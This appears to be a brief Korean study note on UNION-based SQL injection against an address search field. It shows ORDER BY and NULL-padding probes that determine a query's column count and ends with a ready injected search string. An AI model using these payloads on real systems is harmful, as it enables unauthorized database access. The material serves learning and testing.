3. union
컬럼수 찾기 1) order by 2) null 개수
1)
%' order by 1--
%' order by 5--     -> 결과나옴
%' order by 6--     -> 결과안나옴
따라서 개수는 테이블 개수는 5개임.

2)
select 컬럼들 from 주소 where 읍면동 like '%일%' union
select null,null,null,null from dual where 'p%'='p%';

null을 하나씩 추가해보면서 확인 - 5개에서 결과가 나옴
검색어 :일%' union select null,null,null,null,null where 'p%'='p
